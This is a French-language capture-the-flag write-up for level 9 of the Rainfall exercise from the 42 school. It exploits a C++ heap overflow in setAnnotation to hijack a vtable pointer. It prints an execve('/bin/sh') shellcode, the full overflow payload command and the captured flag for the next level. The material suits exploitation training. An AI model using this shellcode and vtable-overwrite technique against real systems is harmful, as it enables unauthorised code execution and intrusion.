# Write-up : Rainfall - Level 9

## Objectif

L'objectif du niveau 9 du projet Rainfall (de l'école 42) est de parvenir à exécuter du shellcode via une exploitation de type **virtual method call hijacking**.

Ce niveau met en jeu l'utilisation de classes C++ avec des méthodes virtuelles, ainsi qu'une mauvaise gestion de la mémoire permettant une exploitation.

---

## Analyse du binaire

La fonction `main` alloue dynamiquement deux objets de type `N` avec deux tailles différentes et des paramètres différents :

```asm
call   80486f6 <_ZN1NC1Ei>  ; constructeur de l'objet N
```

Les pointeurs vers ces objets sont ensuite stockés sur la stack, puis l'un des objets appelle une méthode virtuelle :

```asm
804867c:
 mov    0x10(%esp),%eax         ; eax = pointeur vers l'objet vulnérable
 mov    (%eax),%eax             ; déréférence : vtable
 mov    (%eax),%edx             ; edx = pointeur vers la méthode virtuelle
...
 call   *%edx                   ; appel de la fonction
```

### Vulnérabilité

La méthode `setAnnotation(char *)` est appelée sur le premier objet `N`. Or, cette méthode ne vérifie pas la taille de l'argument, ce qui permet d'écraser la **vtable pointer** de l'objet.

Cela nous permet de **rediriger l'appel de méthode virtuelle vers notre shellcode**.

---

## Exploitation

### Injection du Shellcode dans l'environnement

On injecte un shellcode standard (execve("/bin/sh")) dans une variable d'environnement nommée `SC` :

```bash
export SC=$(python -c 'print("\x90"*1000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68" + "\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")')
```

Avec GDB, on récupère l'adresse du shellcode (dans la variable d'environnement SC) en mémoire, par exemple :

```bash

x/200s *((char**)environ)

0xbfffff2a:      "\220\220\220\061\300Ph//shh/bin\211\343PS\211ᙰ\v̀"

```

### Construction du Payload

1. On place l'adresse du shellcode au début.
2. On remplit avec des `"A"` jusqu'à l'adresse de la vtable pointer.
3. On remplace la vtable pointer par un pointeur pointant vers l'adresse du shellcode.

```bash
./level9 $(python -c 'print("\x2a\xff\xff\xbf" + "A"*104 + "\x0c\xa0\x04\x08")')
```

* `\x2a\xff\xff\xbf` : pointeur vers l'environnement `SC`
* `"A"*104` : padding pour atteindre la vtable
* `\x0c\xa0\x04\x08` : pointeur contrôlé, e.g. pointant sur la vtable modifiée ou directement sur le shellcode

---

## Résultat de l'exploitation

Exécution du programme avec le payload :

```bash
$ ./level9 $(python -c 'print("\x2a\xff\xff\xbf" + "A"*104 + "\x0c\xa0\x04\x08")')
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

---

## Conclusion

Ce challenge est un excellent exemple de :

* Compréhension de la mémoire en C++
* Exploitation de méthodes virtuelles (vtable hijacking)
* Injection de shellcode via les variables d'environnement

> L’adresse du shellcode peut varier selon les machines. Il est important de vérifier avec GDB pour ajuster.
